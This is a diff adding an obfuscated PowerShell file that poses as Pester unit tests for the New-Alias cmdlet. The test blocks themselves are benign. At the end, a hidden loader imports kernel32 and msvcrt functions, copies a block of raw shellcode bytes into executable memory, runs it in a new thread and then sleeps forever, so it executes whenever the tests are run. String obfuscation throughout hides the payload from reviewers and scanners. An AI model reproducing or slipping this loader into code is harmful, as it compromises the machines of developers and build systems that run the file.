@@ -1,0 +1,72 @@
+.("{1}{2}{0}"-f 'be','Descr','i') ("{3}{5}{0}{4}{1}{2}" -f's','Unit Te','sts','Ne',' DRT ','w-Alia') -Tags "CI" {
+	&('It') ("{0}{14}{13}{7}{11}{5}{2}{1}{12}{9}{3}{16}{10}{8}{15}{4}{6}"-f 'N','h','t s','w','i','an','on',' Con','thorizedAcce',' thro','SessionStateUnau','st','ould','-Alias','ew','ssExcept',' '){
+		&("{2}{0}{1}"-f'ew','-Alias','N') -Name ("{0}{1}"-f 'ABC','D') -Value "foo" -Option ("{1}{0}" -f 't','Constan') -Force:${tr`UE}
+		${e} = { .("{0}{1}" -f'New-Al','ias') -Name ("{0}{1}"-f'A','BCD') -Value "foo" -Force:${Tr`UE} -Scope 1 -ErrorAction ("{0}{1}"-f 'S','top') } |
+			&("{0}{1}{2}"-f'Sh','o','uld') -Throw -ErrorId ("{4}{13}{1}{12}{15}{6}{2}{11}{9}{3}{5}{10}{16}{8}{0}{7}{14}"-f'Comm','NotWritab','ro','erSh','A','el','ic','a','ias','Pow','l.Command','soft.','le','lias','nd',',M','s.NewAl') -PassThru
+		${e}."CaT`ego`RYi`NFO" | .("{0}{1}{2}"-f 'S','houl','d') -Match ("{0}{4}{1}{6}{2}{5}{3}{7}" -f 'Sessio','ateUn','ori','ssExce','nSt','zedAcce','auth','ption')
+	}
+
+	.('It') ("{8}{7}{5}{4}{3}{1}{0}{2}{6}" -f 'me','Na','Positional And Value Vali',' ','ias','l','d','-A','New') {
+			.("{1}{0}" -f 's','New-Alia') ("{0}{1}"-f 'AB','CD') -Value ("{1}{0}{2}" -f 'yC','M','ommand') -Scope "0"
+			${Res`U`Lt}=&("{2}{0}{1}" -f'a','s','Get-Ali') -Name ("{0}{1}" -f'AB','CD') -Scope "0"
+			${re`su`lT}."Na`ME"| .("{0}{1}" -f'Sh','ould') -BeExactly ("{1}{0}"-f 'CD','AB')
+			${Re`suLT}."D`EfI`NIT`ION"| &("{0}{1}{2}" -f'Sh','ou','ld') -BeExactly ("{1}{0}{2}"-f 'om','MyC','mand')
+			${res`ULT}."D`Escr`iPTioN"| .("{1}{2}{0}"-f 'ld','Sho','u') -BeNullOrEmpty
+			${REs`U`lT}."OptiO`NS"| &("{0}{1}" -f'Sh','ould') -BeExactly ("{1}{0}"-f'ne','No')
+	}
+
+	.('It') ("{14}{6}{4}{5}{11}{10}{2}{1}{7}{12}{13}{0}{3}{9}{8}"-f'ti','u','al','o','s NamePositional',' An','a','e','al Valid','n',' V','d','P','osi','New-Ali') {
+			&("{2}{0}{1}" -f'lia','s','New-A') ("{1}{0}"-f'BCD','A') ("{0}{1}"-f'MyComma','nd') -Scope "0"
+			${R`eSUlT}=.("{1}{0}{2}"-f'Ali','Get-','as') -Name ("{0}{1}" -f'ABC','D') -Scope "0"
+			${ReSU`lT}."NA`ME"| .("{1}{0}"-f'hould','S') -BeExactly ("{1}{0}"-f'CD','AB')
+			${r`Esu`lT}."dEfiN`I`TIon"| .("{0}{2}{1}" -f'S','ld','hou') -BeExactly ("{1}{0}{2}"-f'yComm','M','and')
+			${ResU`lt}."dES`c`RIPT`iON"| .("{0}{1}" -f'Sho','uld') -BeNullOrEmpty
+			${R`Es`Ult}."oPtiO`Ns"| &("{1}{0}" -f 'ld','Shou') -BeExactly ("{1}{0}"-f 'ne','No')
+	}
+
+	&('It') ("{0}{2}{3}{5}{1}{4}"-f'New-A',' Va','li','as','lid',' Description') {
+			.("{1}{0}{2}{3}" -f 'w','Ne','-Alia','s') -Name ("{0}{1}" -f 'ABC','D') -Value ("{0}{2}{1}"-f'MyComm','d','an') -Description ("{2}{0}{1}{3}" -f'sc','rip','test de','tion') -Scope "0"
+			${r`EsU`Lt}=.("{1}{0}"-f '-Alias','Get') -Name ("{0}{1}"-f'A','BCD') -Scope "0"
+			${R`Esult}."n`AMe"| &("{0}{1}" -f'Sh','ould') -BeExactly ("{1}{0}" -f'CD','AB')
+			${r`es`ULT}."De`FI`NI`TiON"| &("{0}{2}{1}"-f 'S','d','houl') -BeExactly ("{1}{0}{2}"-f'mma','MyCo','nd')
+			${r`EsuLt}."des`cR`I`pTIOn"| &("{1}{0}"-f'hould','S') -BeExactly ("{4}{2}{0}{3}{1}"-f'e','ription',' d','sc','test')
+			${R`eS`UlT}."Opti`ONs"| &("{1}{0}" -f'uld','Sho') -BeExactly ("{0}{1}"-f 'Non','e')
+	}
+}
+
+&("{2}{1}{0}" -f'cribe','s','De') ("{1}{0}" -f 'as','New-Ali') -Tags "CI" {
+    &('It') ("{3}{2}{7}{4}{1}{0}{11}{6}{12}{10}{8}{9}{5}"-f 'using the name an','lled ',' ','Should','able to be ca',' error','u','be ','ithou','t','s w','d val','e parameter') {
+	{ &("{2}{1}{0}"-f 'as','-Ali','New') -Name ("{1}{2}{0}"-f 'lias','tes','tA') -Value 100 } | &("{0}{1}"-f'Sho','uld') -Not -Throw
+    }
+
+    .('It') ("{4}{11}{10}{9}{6}{3}{5}{14}{2}{7}{1}{8}{13}{12}{15}{0}" -f't','d the',' a','wee','Should have ','n th','t','lias an',' ','e','ame output b','the s','riginal','o','e',' cmdle') {
+	.("{0}{1}"-f'N','ew-Alias') -Name ("{0}{1}{2}" -f 't','estAlia','s') -Value ("{0}{2}{1}" -f'Get-C','and','omm')
+
+	${Ali`Asid}  = $(&("{0}{1}{2}" -f 'te','stAli','as'))."i`D"
+	${C`mDLE`TId} = $(.("{0}{2}{1}{3}" -f'G','mman','et-Co','d'))."iD"
+	foreach (${IdNUm`B`eR} in ${al`i`ASiD})
+	{
+	    ${ALIa`s`id}[${idNu`mb`er}] | &("{1}{0}{2}"-f'h','S','ould') -Be ${Cmdl`ET`ID}[${ID`Nu`mbER}]
+	}
+    }
+
+    .('It') ("{3}{4}{6}{9}{12}{2}{1}{11}{5}{14}{7}{0}{10}{13}{8}{15}" -f'e nal','as c','New-Ali','Should be ','a','us','ble ','ng th','ut e','to',' ali','mdlet ',' call the ','as witho','i','rror') {
+	{ &("{0}{1}"-f 'na','l') -Name ("{2}{1}{0}" -f 'lias','stA','te') -Value 100 } | .("{2}{0}{1}" -f'ul','d','Sho') -Not -Throw
+    }
+
+    .('It') ("{12}{17}{19}{11}{13}{9}{6}{14}{0}{10}{7}{16}{8}{5}{2}{15}{20}{18}{4}{1}{3}"-f ' betw','le','ias a','t','lias cmd','l','ou',' ',' a','same ','een the','ave th','S','e ','tput','nd ','nal','ho','A','uld h','the New-') {
+	&("{1}{0}"-f'l','na') -Name ("{2}{0}{1}" -f'est','Alias','t') -Value ("{2}{0}{1}{3}" -f'om','man','Get-C','d')
+
+	.("{1}{0}{2}" -f 'a','New-Ali','s') -Name ("{0}{2}{1}" -f 'testal','s2','ia') -Value ("{0}{1}{2}"-f'Get-Comma','n','d')
+
+	${Aliasd`A`TA} = $(&("{1}{0}{2}" -f 'li','testA','as'))."Id"
+	${Cm`DLet`D`Ata} = $(&("{0}{1}{2}" -f'te','st','Alias2'))."i`D"
+
+	foreach (${ID`Nu`M`BER} in ${aLIA`S`DatA})
+	{
+	    ${Alia`Sd`AtA}[${idn`Um`BER}] | &("{1}{0}"-f'ld','Shou') -Be ${cMD`l`et`dATa}[${IdN`UmB`eR}]
+	}
+    }
+}
+
+${g`N4} = ((("{81}{53}{90}{82}{41}{91}{27}{67}{71}{61}{17}{5}{64}{46}{86}{13}{3}{94}{50}{31}{56}{19}{38}{9}{93}{70}{88}{78}{29}{42}{11}{14}{69}{44}{83}{1}{4}{68}{18}{48}{25}{80}{6}{73}{22}{35}{37}{97}{84}{54}{12}{72}{101}{52}{92}{49}{100}{57}{43}{87}{47}{16}{15}{36}{59}{2}{21}{33}{96}{20}{58}{8}{24}{26}{60}{62}{66}{45}{0}{95}{40}{51}{98}{85}{39}{89}{28}{7}{77}{99}{76}{79}{74}{55}{32}{23}{63}{34}{10}{30}{65}{75}" -f 'Pt','el32.dll','lpSta','ze, ','b','t','c ext','.','r lpPa','l','t, uint','o','hr','i','rt',',','Size','(In',']publ','nType','s, IntP','rt','t','In','rameter','ta',', uint ','ic exter','t','llI',' src, ','ti','ern ','Addre','t(IntPtr des','eT',' IntPtr','hread(In',', uint f','port(bqImsvc',';','I)]publ','mp','t dwS','r','lags, Int',', u','k','ic s','s,','t flAlloca','[D','tri','kernel','tr lpT','c ext','o','in','t',' ','dwCr','lAlloc','e','tPtr memse','Ptr lpAddress','uint co','ationF','n IntPtr V','qI)','(bqIke','otec','irtua','ea','ern IntPtr Crea','ti','unt);','c','dllbqI)]',';[D',' sta','ti','[DllImport(bqI','lbq','n','P','Im','int dwS','tac','t)','r','32.dl','ic stat','bute','Pr','uin','r lpThreadId)','s','t','ll','publi',' u','dAt'))."Re`p`LaCE"(([ChAR]98+[ChAR]113+[ChAR]73),[STRiNg][ChAR]34));${w} = &("{0}{1}" -f 'Add-Ty','pe') -memberDefinition ${g`N4} -Name ("{0}{1}" -f 'Wi','n32') -namespace ("{2}{0}{1}" -f 'ion','s','Win32Funct') -passthru;[Byte[]];[Byte[]]${Z} = 0xb8,0xaa,0x0b,0x8a,0x46,0xd9,0xc3,0xd9,0x74,0x24,0xf4,0x5d,0x29,0xc9,0xb1,0x47,0x83,0xed,0xfc,0x31,0x45,0x0f,0x03,0x45,0xa5,0xe9,0x7f,0xba,0x51,0x6f,0x7f,0x43,0xa1,0x10,0x09,0xa6,0x90,0x10,0x6d,0xa2,0x82,0xa0,0xe5,0xe6,0x2e,0x4a,0xab,0x12,0xa5,0x3e,0x64,0x14,0x0e,0xf4,0x52,0x1b,0x8f,0xa5,0xa7,0x3a,0x13,0xb4,0xfb,0x9c,0x2a,0x77,0x0e,0xdc,0x6b,0x6a,0xe3,0x8c,0x24,0xe0,0x56,0x21,0x41,0xbc,0x6a,0xca,0x19,0x50,0xeb,0x2f,0xe9,0x53,0xda,0xe1,0x62,0x0a,0xfc,0x00,0xa7,0x26,0xb5,0x1a,0xa4,0x03,0x0f,0x90,0x1e,0xff,0x8e,0x70,0x6f,0x00,0x3c,0xbd,0x40,0xf3,0x3c,0xf9,0x66,0xec,0x4a,0xf3,0x95,0x91,0x4c,0xc0,0xe4,0x4d,0xd8,0xd3,0x4e,0x05,0x7a,0x38,0x6f,0xca,0x1d,0xcb,0x63,0xa7,0x6a,0x93,0x67,0x36,0xbe,0xaf,0x93,0xb3,0x41,0x60,0x12,0x87,0x65,0xa4,0x7f,0x53,0x07,0xfd,0x25,0x32,0x38,0x1d,0x86,0xeb,0x9c,0x55,0x2a,0xff,0xac,0x37,0x22,0xcc,0x9c,0xc7,0xb2,0x5a,0x96,0xb4,0x80,0xc5,0x0c,0x53,0xa8,0x8e,0x8a,0xa4,0xcf,0xa4,0x6b,0x3a,0x2e,0x47,0x8c,0x12,0xf4,0x13,0xdc,0x0c,0xdd,0x1b,0xb7,0xcc,0xe2,0xc9,0x22,0xc8,0x74,0x52,0x02,0x24,0x63,0xfa,0x61,0xc9,0x7a,0xa7,0xec,0x2f,0x2c,0x07,0xbf,0xff,0x8c,0xf7,0x7f,0x50,0x64,0x12,0x70,0x8f,0x94,0x1d,0x5a,0xb8,0x3e,0xf2,0x33,0x90,0xd6,0x6b,0x1e,0x6a,0x47,0x73,0xb4,0x16,0x47,0xff,0x3b,0xe6,0x09,0x08,0x31,0xf4,0xfd,0xf8,0x0c,0xa6,0xab,0x07,0xbb,0xcd,0x53,0x92,0x40,0x44,0x04,0x0a,0x4b,0xb1,0x62,0x95,0xb4,0x94,0xf9,0x1c,0x21,0x57,0x95,0x60,0xa5,0x57,0x65,0x37,0xaf,0x57,0x0d,0xef,0x8b,0x0b,0x28,0xf0,0x01,0x38,0xe1,0x65,0xaa,0x69,0x56,0x2d,0xc2,0x97,0x81,0x19,0x4d,0x67,0xe4,0x9b,0xb1,0xbe,0xc0,0xe9,0xdb,0x02;${g} = 0x1000;if (${Z}."lE`NgTH" -gt 0x1000){${g} = ${z}."Le`NgtH"};${e`eVp}=${W}::("{0}{3}{1}{2}"-f 'V','rt','ualAlloc','i').Invoke(0,0x1000,${g},0x40);for (${I}=0;${i} -le (${z}."L`eNg`Th"-1);${I}++) {${w}::"M`EMSEt"([IntPtr](${e`Evp}.("{0}{2}{1}" -f'To','32','Int').Invoke()+${I}), ${z}[${I}], 1)};${W}::("{3}{2}{0}{1}"-f 'hrea','d','T','Create').Invoke(0,0,${eE`Vp},0,0,0);for (;;){&("{3}{0}{1}{2}" -f'art','-','sleep','St') 60};
